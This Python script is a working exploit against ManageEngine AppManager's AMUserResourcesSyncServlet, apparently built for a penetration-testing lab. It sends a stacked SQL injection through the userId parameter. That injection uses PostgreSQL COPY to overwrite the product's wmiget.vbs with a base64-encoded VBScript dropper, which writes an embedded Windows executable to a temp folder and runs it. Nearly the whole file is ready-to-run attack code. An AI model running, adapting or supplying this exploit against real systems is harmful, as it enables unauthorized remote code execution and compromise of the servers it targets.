#!/usr/bin/env python3
"""
exploit_probe.py
Improved proof-of-concept HTTP probe with SQL payload construction, optional Burp proxy,
timeouts, and safer printing / saving of responses.

Usage:
    python3 exploit_probe.py <rhost> [rport] [lhost] [lport] [websrv_port]
    Or use the flags (--post, --no-burp, --save <file>) for more control.
"""
import argparse
import subprocess
import sys
import time
from urllib.parse import quote

import requests
import urllib3

# ----- Config -----
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Toggleable runtime defaults
BURP_PROXIES = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
DEFAULT_TIMEOUT = 12  # seconds
DEFAULT_HTTPS_PORT = 443

# ANSI colors (small set)
YELLOW = "\033[33m"
DARK_WHITE = "\033[2;37m"
BLUE = "\033[34m"
RESET = "\033[0m"

# ----- Helpers -----
def print_banner_message(message):
    banner = f"{YELLOW}{{[+]}}{RESET}"
    print(f"{banner} {DARK_WHITE}{message}{RESET}")

def print_error_message(message):
    banner = f"{YELLOW}{{[+]}}{RESET}"
    print(f"{banner} {DARK_WHITE}{message}{RESET}")

def get_tun0_ip():
    """Return the IPv4 for tun0, or raise a RuntimeError."""
    try:
        result = subprocess.run(["ip", "address", "show", "dev", "tun0"],
                                capture_output=True, text=True, check=True)
    except subprocess.CalledProcessError:
        raise RuntimeError("Failed to query tun0. Is the interface up?")
    for line in result.stdout.splitlines():
        line = line.strip()
        if line.startswith("inet "):
            return line.split()[1].split("/")[0]
    raise RuntimeError("No IP address found for tun0")

# ----- CLI -----
def parse_arguments():
    p = argparse.ArgumentParser(description="HTTP probe with injectable payload (PoC).")
    p.add_argument("rhost", help="Remote target host (IP or hostname)")
    p.add_argument("rport", nargs="?", type=int, default=DEFAULT_HTTPS_PORT,
                   help=f"Remote port (default: {DEFAULT_HTTPS_PORT} for HTTPS)")
    p.add_argument("lhost", nargs="?", default=None,
                   help="Local server IP to advertise (default: tun0 IP)")
    p.add_argument("lport", nargs="?", type=int, default=443, help="Local server port (default: 443)")
    p.add_argument("websrv_port", nargs="?", type=int, default=80, help="Local webserver port (default: 80)")
    p.add_argument("--no-burp", action="store_true", help="Don't route requests through Burp proxy")
    p.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT, help=f"Request timeout seconds (default {DEFAULT_TIMEOUT})")
    p.add_argument("--endpoint", default="/servlet/AMUserResourcesSyncServlet", help="Target endpoint (default AMUserResourcesSyncServlet)")
    p.add_argument("--post", action="store_true", help="Send payload as POST body instead of in querystring")
    p.add_argument("--save", metavar="FILE", help="Save full response body to FILE")
    p.add_argument("--quiet", action="store_true", help="Suppress verbose banners and only show minimal output")
    args = p.parse_args()

    if args.lhost is None:
        try:
            args.lhost = get_tun0_ip()
        except RuntimeError as e:
            print_error_message(str(e))
            sys.exit(1)

    return args

# ----- Payload / URL building -----
def build_payload():
    """
    The payload used in the PoC. Adjust as needed for your target.
    NOTE: Keep payloads small for GETs (URL length limits).
    """
    # Example: time-based + file-write COPY for Postgres on Windows (adjust to taste)
    return "1; COPY (SELECT convert_from(decode($$Ok9uIEVycm9yIFJlc3VtZSBOZXh0OlNldCBvYmpXYmVtTG9jYXRvciA9IENyZWF0ZU9iamVjdCgiV2JlbVNjcmlwdGluZy5TV2JlbUxvY2F0b3IiKTo6aWYgRXJyLk51bWJlciBUaGVuOldTY3JpcHQuRWNobyB2YkNyTGYgJiAiRXJyb3IgIyAiICYiICIgJiBFcnIuRGVzY3JpcHRpb246RW5kIElmOk9uIEVycm9yIEdvVG8gMDo6T24gRXJyb3IgUmVzdW1lIE5leHQ6Ojo6U2VsZWN0IENhc2UgV1NjcmlwdC5Bcmd1bWVudHMuQ291bnQ6Q2FzZSAyOjpzdHJDb21wdXRlciA9IFdzY3JpcHQuQXJndW1lbnRzKDApOnN0clF1ZXJ5ID0gV3NjcmlwdC5Bcmd1bWVudHMoMSk6U2V0IHdiZW1TZXJ2aWNlcyA9IG9ialdiZW1Mb2NhdG9yLkNvbm5lY3RTZXJ2ZXIoc3RyQ29tcHV0ZXIsIlJvb3RcQ0lNVjIiKTo6ICAgICAgOjpDYXNlIDQ6c3RyQ29tcHV0ZXIgPSBXc2NyaXB0LkFyZ3VtZW50cygwKTpzdHJVc2VybmFtZSA9IFdzY3JpcHQuQXJndW1lbnRzKDEpOnN0clBhc3N3b3JkID0gV3NjcmlwdC5Bcmd1bWVudHMoMik6c3RyUXVlcnkgPSBXc2NyaXB0LkFyZ3VtZW50cygzKTpTZXQgd2JlbVNlcnZpY2VzID0gb2JqV2JlbUxvY2F0b3IuQ29ubmVjdFNlcnZlcihzdHJDb21wdXRlciwiUm9vdFxDSU1WMiIsc3RyVXNlcm5hbWUsc3RyUGFzc3dvcmQpOjogICAgICAgY2FzZSA2OiAgICAgICAgICAgICAgIHN0ckNvbXB1dGVyID0gV3NjcmlwdC5Bcmd1bWVudHMoMCk6ICAgICAgIHN0clVzZXJuYW1lID0gV3NjcmlwdC5Bcmd1bWVudHMoMSk6ICAgICAgICBzdHJQYXNzd29yZCA9IFdzY3JpcHQuQXJndW1lbnRzKDIpOiAgICAgICBzdHJRdWVyeSA9IFdzY3JpcHQuQXJndW1lbnRzKDQpOiAgICAgICBuYW1lc3BhY2UgPSBXc2NyaXB0LkFyZ3VtZW50cyg1KTogICAgICAgOiAgICAgICBTZXQgd2JlbVNlcnZpY2VzID0gb2JqV2JlbUxvY2F0b3IuQ29ubmVjdFNlcnZlcihzdHJDb21wdXRlcixuYW1lc3BhY2Usc3RyVXNlcm5hbWUsc3RyUGFzc3dvcmQpOkNhc2UgRWxzZTpzdHJNc2cgPSAiRXJyb3IgIyBpbiBwYXJhbWV0ZXJzIHBhc3NlZCI6V1NjcmlwdC5FY2hvIHN0ck1zZzpXU2NyaXB0LlF1aXQoMCk6OkVuZCBTZWxlY3Q6Ojo6U2V0IHdiZW1TZXJ2aWNlcyA9IG9ialdiZW1Mb2NhdG9yLkNvbm5lY3RTZXJ2ZXIoc3RyQ29tcHV0ZXIsIG5hbWVzcGFjZSwgc3RyVXNlcm5hbWUsIHN0clBhc3N3b3JkKTo6aWYgRXJyLk51bWJlciBUaGVuOldTY3JpcHQuRWNobyB2YkNyTGYgJiAiRXJyb3IgIyAiICAmIiAiICYgRXJyLkRlc2NyaXB0aW9uOkVuZCBJZjo6T24gRXJyb3IgR29UbyAwOjpPbiBFcnJvciBSZXN1bWUgTmV4dDo6OjpTZXQgY29sSXRlbXMgPSB3YmVtU2VydmljZXMuRXhlY1F1ZXJ5KHN0clF1ZXJ5KTo6aWYgRXJyLk51bWJlciBUaGVuOldTY3JpcHQuRWNobyB2YkNyTGYgJiAiRXJyb3IgIyAiICAmIiAiICYgRXJyLkRlc2NyaXB0aW9uOkVuZCBJZjpPbiBFcnJvciBHb1RvIDA6OjppPTA6Rm9yIEVhY2ggb2JqSXRlbSBpbiBjb2xJdGVtczppZiBpPTAgdGhlbjpoZWFkZXIgPSAiIjpGb3IgRWFjaCBwYXJhbSBpbiBvYmpJdGVtLlByb3BlcnRpZXNfOmhlYWRlciA9IGhlYWRlciAmIHBhcmFtLk5hbWUgJiB2YlRhYjpOZXh0OldTY3JpcHQuRWNobyBoZWFkZXI6aT0xOmVuZCBpZjpzZXJ2aWNlRGF0YSA9ICIiOkZvciBFYWNoIHBhcmFtIGluIG9iakl0ZW0uUHJvcGVydGllc186c2VydmljZURhdGEgPSBzZXJ2aWNlRGF0YSAmIHBhcmFtLlZhbHVlICYgdmJUYWI6TmV4dDpXU2NyaXB0LkVjaG8gc2VydmljZURhdGE6TmV4dDpGdW5jdGlvbiBqZWltaVJQVmYoTkhtVEZNUUpCKTpWd0htS2x6QmcgPSAiPEI2NERFQ09ERSB4bWxuczpkdD0iJiBDaHIoMzQpICYgInVybjpzY2hlbWFzLW1pY3Jvc29mdC1jb206ZGF0YXR5cGVzIiAmIENocigzNCkgJiAiICIgJiAiZHQ6ZHQ9IiAmIENocigzNCkgJiAiYmluLmJhc2U2NCIgJiBDaHIoMzQpICYgIj4iICYgTkhtVEZNUUpCICYgIjwvQjY0REVDT0RFPiI6U2V0IE1BR2hsR0N6WU4gPSBDcmVhdGVPYmplY3QoIk1TWE1MMi5ET01Eb2N1bWVudC4zLjAiKTpNQUdobEdDellOLkxvYWRYTUwoVndIbUtsekJnKTpqZWltaVJQVmYgPSBNQUdobEdDellOLnNlbGVjdHNpbmdsZW5vZGUoIkI2NERFQ09ERSIpLm5vZGVUeXBlZFZhbHVlOnNldCBNQUdobEdDellOID0gbm90aGluZzpFbmQgRnVuY3Rpb246OkZ1bmN0aW9uIGpscWhmdGhtY3ptR3RXKCk6WFFwc2pwU3QgPSAiVFZxUUFBTUFBQUFFQUFBQS8vOEFBTGdBQUFBQUFBQUFRQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFnQUFBQUE0ZnVnNEF0QW5OSWJnQlRNMGhWR2hwY3lCd2NtOW5jbUZ0SUdOaGJtNXZkQ0JpWlNCeWRXNGdhVzRnUkU5VElHMXZaR1V1RFEwS0pBQUFBQUFBQUFCUVJRQUFUQUVEQUU0YWpFY0FBQUFBQUFBQUFPQUFEd01MQVFJNEFBSUFBQUFPQUFBQUFBQUFBQkFBQUFBUUFBQUFJQUFBQUFCQUFBQVFBQUFBQWdBQUJBQUFBQUVBQUFBRUFBQUFBQUFBQUFCQUFBQUFBZ0FBUmpvQUFBSUFBQUFBQUNBQUFCQUFBQUFBRUFBQUVBQUFBQUFBQUJBQUFBQUFBQUFBQUFBQUFBQXdBQUJrQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQzUwWlhoMEFBQUFLQUFBQUFBUUFBQUFBZ0FBQUFJQUFBQUFBQUFBQUFBQUFBQUFBQ0FBTUdBdVpHRjBZUUFBQUpBS0FBQUFJQUFBQUF3QUFBQUVBQUFBQUFBQUFBQUFBQUFBQUFBZ0FERGdMbWxrWVhSaEFBQmtBQUFBQURBQUFBQUNBQUFBRUFBQUFBQUFBQUFBQUFBQUFBQUFRQUF3d0FBQUFBQUFBQUFBQUFBQUFBQUFBQUM0QUNCQUFQL2drUDhsT0RCQUFKQ1FBQUFBQUFBQUFBRC8vLy8vQUFBQUFQLy8vLzhBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBTnJGdXIxTlVsdlpkQ1QwWGpQSlpya0VBakZXR2dOV0dvUHVRYStuYW5sWVFKMDVtVFJpaWYwOXZGZU1hNU5jdFU0eTFtNmJuVCttMGt3T1NBZnlzS3drOVdoaEpPZ0U2OGpQV2Y5VHlCM012V0h5c1padTBONHVHcjhDMnFEdmtDY3I3bWVYWHBHOHZDb0tWMFNtTUI3R2J6MmtBYWRQOWJrYjU0ODlKZTRiRXpFQnl3YXQxMGo5WGd3T0EwVGR6ZnBwQUROU29NL25CVlhtT0p3MHNiVEJmSEtSbFZQbjJxSWxJdksvYkFWSUdKUjdDNVdxeVhzVk94Zlp3TzhoYjF1RlQwZGtOa0x2QmlDOExjY0VVTi9xRE1YaUw0cEsvNjE3cDVUMXExUXQrZ3F3MlArOGJDYXR4UFZtaTUwZ2ZEb21vOGIzM3RyekpUeDZsbnNnTG1XRnVRbUdJNHBQMG1nWUN6UlE2ZC9JOUw1bmNkcjd6OGZZdXJVS0Z2UmNzME5SbkgyNE5HVmFWb3R2RWQvSks5VStXTEpUZVdJTHF1dUdNU3JRRXl6Z0MzNGg2UXUwRkFEUTFnTnZ5c2NJbVJsK0UyTkgzSEJLOGNUaThRNDRQeTlHUW1WYU9UK2ZjR1pqSE4yTllJQVI0d3d5VEVCdmpzdVBEeXRBeHRGemY3WXJ5N0VETUVTRGQ4bW5JVGxCU0NUNGNmUXFnakYvR2YwRWFIOUcxOS9LU2hUNjBOVml2bXRrK2N2djB1Q0gyZTlDVTZVeStyeE53UlZaTzVncGdBdGdrd2NaRHZQT1dXSi9yTlF3UnNVNmpkU21HeXcxOEIwVHdzUUJDZVlvWUlwNUs4bkVYVU1ua3U2alFjNDRQWWJqck1HS3kyc0syZzdTOXlCNkk3YnBNYmJFSVlKU0RhZ3kzNEhxeHB2aW9lZzVLMjFHTTZ3dEtjOS9DR3h1akVmUjVaUE1DQmM1aXB1M1EzaUxlK2hCQWZVa0tXVVRzUFJFOGtpTG1vRVdkK251eEtwN1F6bWpGQmR1M2RFbTZNY1pBenl4MFBhOHVaWTV2aG5BN0I4aDUyU0NtalMzL3ZwUTkzWE1DOTRsVFlpRWpTN204Z0lrZ1B1TFJxVDh1VldDQ0JDOWtSVm5hK09OWkZSdUZrQnBZV3FWTHFkUlNUOTBGM1pyNVN0QkZhWjBOWWY4TnZUZ0JxTmgrclRFVU1ya0daTmp0aTVkRkxENGhnaVJnR3E4dGZVbTNxc29IZUVpV0s4Z3hIU3IwVWxvODR2LzZsQW5ZWTFObjJ3bkZ1a3VwSmlTU0Y5N2Q5bkhuNWRqYmZUYjhkVnJ6SXQzc3ZTZEp4RDFFdkxlY0ozcHUwYWdEM21pN3RNd05lVlVISVB5dm5kbDRMRXgxNFJxUTVSZUpOWFlOQlRNSmR2UFVrTHpYejRUWHpxSG5vOSt0RVp1UUNTbXE5N0ViWVZyYlF2MnlJeCtiSGtLOFJCWnpGL2JPWTVPS3FSWDlvdHNka1czZUdWakxIbXRwalZybkVLUGliSExwRTlPcmphR1NFclZvd29JTEg1RmwwQ1Q2bXhVL1kxb1MyRWV5MktFVXRNMVlra3E3TDlPMmFsQmdOazFBaWMwdDg4aWp2Vmo0WlltQWhGVzA2SFd1TUREZGx3czI2QXNNc2ZsMitaYlczZW5kcWZzTDJUcmZKTm1YQnMxTmpoSTk3L1h5VnJGc1pxSmFVZVZVandPUzFKSmt6WlhKcG1XS21UMkxRcmRCWUVQOEc4Y1c4WUpKRS9CaTN5RzhSVHp0dW5FUjJJQVFhZWJuOUhMMnRFM1E3QWxMM1VYaXI5NjJnRktnek40NEt0MDc0RkE1a3BSM3NTdGtYNnhvRTRxVjBVZzNkc1UxN3NOc25nT0dzZVBoYXZQQ09zbUZGZFB0b1dUajhJU0Ywb1lXZEVqRlEyYnBBQTBCbCtodjE3T2xMQlRDUCs3RWRVTmtYbURTV1Z1RzdVR2pVUHhJS3dMZlZKZXhKR0VFVGg1cFdQSmJGTTZtQnVyK01JNGpLUHlkbkllaEtUM3owMHIvRHVleHdjdTJmWFhNdmFUam5wMlhVamFKNmtDd1BPWWlLVVZoOUJaNGYvZ051M3Nycm94dFZPRmd5MmRTeDZCbXNhV0pNRkxCWG1RTXpRenV1SjArejArTUJKcXVUWHpCWm83SlAyajlwdkRhbWlBSURpdkdjU3dYVDZIUWwzQUo2OW5YYjRnQ2NaanJhMVp5TmlkRm54cmtkOGhqTXdYbzd0elRvVEFpN3JkK3hFUHJBVGpKbk55ZUwxU1ZORGNkblVOaVVhV1J2ZFFrcEdYN1dycmxsWWF3U0tQdlRYRnNnZ1VRbjZBZnpZUmlnTGR5cWNTNytoM2Q2ODQwWlNmNkg4enVVbWdRc2d6bFRjSjRrVlc2R3FaNDZZNUFub2J0OEthQ0wzSGwzeCtLV1RzNi8zckhpUEtBalNud1NkeUJCT2hOdDJkeFJlNFc4NUszcXpCY3FYdVc1cmMwZTd0VGdlQUtFSTZ1cUhNRUcxWXN5MkdwcXpxZC9scHdlTXlzQ3RQck1oWFhVVVFPVlBEQjd2eHB2d3ltZllod2thanBXODVpN093VVBUclJ6MGNQRGRCNFVsVG9aL0l0djJJOGx4VXVkRUEvRVdnNytxUjVWQ0hLODhZQUplZHBNdVFUSFAzdzl5N3JGL0hONHVlVFlNZWRWc1QzeVpVZmd5MlhDNGpvTmhGUFBEMTNURVhoWkJQTWNubVR6NWdsNEZxeUxHd2MxZXNEOGQvS2t0TjRYek5heE1ETEJqdW83ZnlZNFNPc3FKankwdU9ZWm5JNGl0SDhLVm9CcWZXRTdXUUdYc2REbFRPUmZoMHZrZlRSMS9uQ2JKbldiVFdIak9SbmcyUFpiL1l4VTZlRnhBdGovNzhLclh6d3pxRm5XT3RVRkw1RDBKb0pIVC9CQkZrUExZUTRJQlR6ejc3ODNialg3WDVQeFdzcGwwWFhNbC84cUNmUEFhVmtaOHBGakRMQ1JuakNJMVV3QXZtZ3UrVHdwRkZrMGpBcXRaQjNyRy82Y2EwMHVCR0crN2FQTjNmNUwwVFVLczVZWTBCOXlGNTY2akloWHR0akxZTHFEQnQ2c004OUZWZ0hXeHlxVVhBZkF2eTZlc2RLMGQ2V3JSN0JHZEcyR3lVMEFSOGVOQXhlTy9DQ0xmQUVqSXd6QmJ5c1FYRnNVRHVYeWJJYlVwcjhuak02MVhINXpmbW56RkdVQVNpK2dTMXFFT1BEallZNitXT1pnd3UxRlpKRk45RnJFVG8zdnd3UEhpSlIvc2NPNmdHYTVCWHM5emw4Vmd2WGNhQ25YZFd3ZjJNQkl5aStrSWo5TVZsY1hxUWE5N0FZRVdyQVdKZ1E0MmhSZ2RhbG5aMTFPeGJRQ3dtM1QyMFBQQjdWYk52WTQyb0NYaGRuZ0RPNDNXVHg2SUhTajlFaSs1V3VkL1hjOTUzSGNheStYbVg2SnBFKzZpeXJuUEJMQ2o1eG5HUjhya0dzQklUSkhHcXc5Nm52ZFY2L0EvTHhIcUQwSlJXbE9ySzNjY21Pd0xsN3I4WHgvRnhTZG51N3FTamswRmpUSVh5cjlVM2VGblkzUEx0aE5ubVFVTXVUeHhpdGY1WWswTUd0WjFFUnhMQ1NsY1ZoZVRwa0xhcVpvU3J6VjdoS21qWDNHeGJ1MldoZkI1TGVSRnhObkZqRUpCdmhiMjB4QXZ2TlZia3pxdThtVnBDVlZSbW1GZTN2NkU3dDU3dThiWEF6Ylh1Vk5NNzkrYnhhVWxPejhtWGFoVXBXN2NKNHJPUDVqNUdadWRDTUpvSW1EOXZ4elIxWXFPNXU0UnBWVHFQZHVISm1GUFNmVDZwczFHVytSNWhKTFdvTTVYbE1nUm1HQk9sMzMwL21mS1BrTEVwUHo0dVRNN1JKTWdaQXRsbW84NDJ2U0l5Tm9kNStDZktsaS9JWXl6NHl1bUJQWFpvVFhoOUFsTUVSN2hKMDdTQ1JCWDVFK3ZJNnBkUmszcUNVYWNWdFRSUFZLTmprV3pwN2RJNWRrVzFmQ3ltbWEvMUNDZytKMXM0TjJjc0ltM3M0cDB3VGJqVkI1azVmRlhhazczdjlVMFBzVkN6ZHoxdHhGc3JoR1ZDWXp3ZDdYRTZnSE1vWjZtM3ZzY3U1TmtTNXlHVlNQKzFMNGdOODdOQURZdEUwR3NGYkxJaHJQZVgxYk54ODQ3Q2Noa3ZpSTl6L3V4YW1EV1dvRmg3R1FoRGxoL2dieWxmQmUwd29CdjJBS1lUbEFBNXZvcGZHTjY2bU5OUXFrOEZFd0J5STBxTkxqUENHVVMyemdBZE1NUlVxYTk1TjhWT2pzN096ZDZVVW52N0xyQXhFZTlLdUlrNWh1amFVd0ZBNnhTRC9QV3U4RHcyVFp4czdTWkZvVVBDaUJHR0VxZEVBZlJUOXF0RllCRWtHUTZTSmtEeGFXWDh6S3pUblJGSEwvWmN2NEl0WStDNXQxc3YzOXRtTFVjSjlUL1V4bSs5OE9YalhELzNHd2xsem83dkxUNWtWYWo5V2c2TDdOQ0FIaXpOdzFkRmtaY2pYdThqUVUrcmpLOHV3OFQrREtDbHRLbDBRc3FENU1DdWxEQmo4SEJJUnBIbEh6RWhkRktPRG9qNzRaNlBaOEdLV3RtMkFMTnRLSzFYdlJ1VWtBUXQ4ZDNSeTVwb2ZSTEoxM3FVS0FURWlRQWJLTnNXejVLWWRSQkdpUndBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUN3d0FBQUFBQUFBQUFBQUFGUXdBQUE0TUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBUURBQUFBQUFBQUFBQUFBQVFEQUFBQUFBQUFDY0FFVjRhWFJRY205alpYTnpBQUFBQURBQUFFdEZVazVGVERNeUxtUnNiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBU0dZVnQvLzdrT1o5T2w2c2NWS2R3U1lVYnVaRkd3UnFIZUZ5cTRUK3Z3PT0iOkRpbSBQcEtjWENKVXpaREpRWUE6U2V0IFBwS2NYQ0pVelpESlFZQSA9IENyZWF0ZU9iamVjdCgiU2NyaXB0aW5nLkZpbGVTeXN0ZW1PYmplY3QiKTpEaW0gY1lxZklBQ1VEQm86RGltIGNyWW9KSHN0OlNldCBjWXFmSUFDVURCbyA9IFBwS2NYQ0pVelpESlFZQS5HZXRTcGVjaWFsRm9sZGVyKDIpOmNyWW9KSHN0ID0gY1lxZklBQ1VEQm8gJiAiXCIgJiBQcEtjWENKVXpaREpRWUEuR2V0VGVtcE5hbWUoKTpQcEtjWENKVXpaREpRWUEuQ3JlYXRlRm9sZGVyKGNyWW9KSHN0KTpwVVJVYUZRc3UgPSBjcllvSkhzdCAmICJcIiAmICJMRVZoZmFhSW1BSXlLYS5leGUiOkRpbSBQSnpycXNPUUE6U2V0IFBKenJxc09RQSA9IENyZWF0ZU9iamVjdCgiV3NjcmlwdC5TaGVsbCIpOlJDek5nRXl4dHJ4QUtLUSA9IGplaW1pUlBWZihYUXBzanBTdCk6U2V0IEhJU0pjcXNPeUtnQVNpID0gQ3JlYXRlT2JqZWN0KCJBRE9EQi5TdHJlYW0iKTpISVNKY3FzT3lLZ0FTaS5UeXBlID0gMTpISVNKY3FzT3lLZ0FTaS5PcGVuOkhJU0pjcXNPeUtnQVNpLldyaXRlIFJDek5nRXl4dHJ4QUtLUTpISVNKY3FzT3lLZ0FTaS5TYXZlVG9GaWxlIHBVUlVhRlFzdSwgMjpQSnpycXNPUUEucnVuIHBVUlVhRlFzdSwgMCwgdHJ1ZTpQcEtjWENKVXpaREpRWUEuRGVsZXRlRmlsZShwVVJVYUZRc3UpOlBwS2NYQ0pVelpESlFZQS5EZWxldGVGb2xkZXIoY3JZb0pIc3QpOkVuZCBGdW5jdGlvbjo6amxxaGZ0aG1jem1HdFc6V1NjcmlwdC5RdWl0KDApOg==$$, $$base64$$), $$utf-8$$)) TO $$C:\\\\Program Files (x86)\\ManageEngine\\AppManager12\\working\\conf\\application\\scripts\\wmiget.vbs$$; SELECT pg_sleep(10);--"

def build_url(rhost, rport, endpoint, encoded_payload):
    return f"https://{rhost}:{rport}{endpoint}?ForMasRange=1&userId={encoded_payload}"

# ----- Request sending -----
def send_request(url=None, post=False, post_body=None, timeout=DEFAULT_TIMEOUT, use_burp=True):
    proxies = BURP_PROXIES if use_burp else None
    try:
        start = time.time()
        if post:
            # Send as POST with content-type application/x-www-form-urlencoded
            r = requests.post(url, data=post_body, verify=False, proxies=proxies, timeout=timeout)
        else:
            r = requests.get(url, verify=False, proxies=proxies, timeout=timeout)
        elapsed = time.time() - start
        return {"response": r, "elapsed": elapsed}
    except requests.Timeout as e:
        return {"error": f"Timeout ({timeout}s): {e}"}
    except requests.RequestException as e:
        return {"error": f"Request error: {e}"}

# ----- Output helpers -----
def print_response_info(result, quiet=False):
    if "error" in result:
        print_error_message(result["error"])
        return

    r = result["response"]
    elapsed = result.get("elapsed", 0.0)
    if not quiet:
        print_banner_message(f"Request completed in {elapsed:.2f} seconds")

    # Print status line and headers
    status_line = f"HTTP/1.1 {r.status_code} {r.reason}"
    print(status_line)
    for k, v in r.headers.items():
        print(f"{k}: {v}")
    print()

    # Print truncated body for safety
    body = r.text or ""
    max_show = 4000
    if len(body) > max_show:
        print(body[:max_show])
        print("\n...[truncated]... (use --save to write full body to disk)")
    else:
        print(body)

def save_body_if_requested(result, save_path):
    if not save_path or "response" not in result:
        return
    try:
        with open(save_path, "w", encoding="utf-8", newline="\n") as f:
            f.write(result["response"].text)
        print_banner_message(f"Saved full response body to: {save_path}")
    except Exception as e:
        print_error_message(f"Failed to save response: {e}")

# ----- Main flow -----
def main():
    args = parse_arguments()

    if not args.quiet:
        print_banner_message(f"Remote Host: {args.rhost}")
        print_banner_message(f"Remote Port: {args.rport}")
        print_banner_message(f"Server IP (lhost): {args.lhost}")
        print_banner_message(f"Server Port (lport): {args.lport}")
        print_banner_message(f"Web Server Port: {args.websrv_port}")
        print_banner_message(f"Endpoint: {args.endpoint}")
        print_banner_message(f"Using Burp: {not args.no_burp}")
        if args.post:
            print_banner_message("Mode: POST (payload in body)")
        else:
            print_banner_message("Mode: GET (payload in query)")

    # Build payload and encode it
    payload = build_payload()
    encoded_payload = quote(payload, safe='')  # encode everything for querystring safety

    if args.post:
        # If using POST, we will send the payload as the body (form-encoded)
        url = f"https://{args.rhost}:{args.rport}{args.endpoint}"
        post_body = {"ForMasRange": "1", "userId": payload}
        if not args.quiet:
            print_banner_message(f"Sending POST to: {url}")
    else:
        url = build_url(args.rhost, args.rport, args.endpoint, encoded_payload)
        post_body = None
        if not args.quiet:
            print_banner_message(f"Sending GET to: {url}")

    # Send the request
    result = send_request(url=url, post=args.post, post_body=post_body, timeout=args.timeout, use_burp=(not args.no_burp))

    # Print/save results
    print_response_info(result, quiet=args.quiet)
    if args.save:
        save_body_if_requested(result, args.save)

if __name__ == "__main__":
    main()
